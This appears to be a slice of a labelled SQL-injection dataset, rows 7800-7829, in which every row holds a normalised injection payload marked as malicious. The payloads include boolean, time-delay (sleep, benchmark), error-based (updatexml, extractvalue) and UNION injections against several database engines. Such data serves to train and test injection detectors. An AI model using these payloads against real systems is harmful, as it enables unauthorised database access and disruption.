row_index,payload_norm,label,sqli_type_hint
7800,"1"" ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""pmmr"" = ""pmmr",1,
7801,"1' in boolean mode ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) #",1,
7802,1' ) ) as qpai where 2619 = 2619,1,
7803,"1"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""eslj"" like ""eslj",1,
7804,"1"" ) ) as yutu where 1306 = 1306 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
7805,"1 where 5925 = 5925 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
7806,"1%' ) union all select null,null,null,null,null,null,null#",1,
7807,"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 3294 = 3294",1,
7808,"-9541 ) as bnky where 3934 = 3934 union all select 3934,3934,3934#",1,
7809,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""stcv"" = ""stcv",1,
7810,1' ) as akvn where 8669 = 8669,1,
7811,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'ankn' = 'ankn",1,
7812,"1"" ) ) as zemm where 3324 = 3324 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
7813,"1 ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 4924 = 4924",1,
7814,"-6267"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""rqws"" = ""rqws",1,
7815,-4351' ) or 6525 = 9458,1,
7816,-6665' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'winx' = 'winx,1,
7817,"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""%"" = """,1,
7818,"1'|| ( select 'baur' from dual where 9384 = 9384 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
7819,"iif ( 6307 = 2459,1,1/0 )",1,
7820,"1"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""hhwy"" = ""hhwy",1,
7821,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'lkun' like 'lkun",1,
7822,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'foju' = 'foju,1,
7823,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'oskf' like 'oskf",1,
7824,"1"" and make_set ( 8403 = 8403,8899 ) and ""bbgg"" = ""bbgg",1,
7825,"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""zzca"" = ""zzca",1,
7826,1' ) ) ) and 7401 = 9838#,1,
7827,1' ) ) as vnwn where 8774 = 8774 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
7828,"end and ( ( ""kvts"" like ""kvts",1,
7829,-6566' ) as kggb where 9768 = 9768 order by 1--,1,
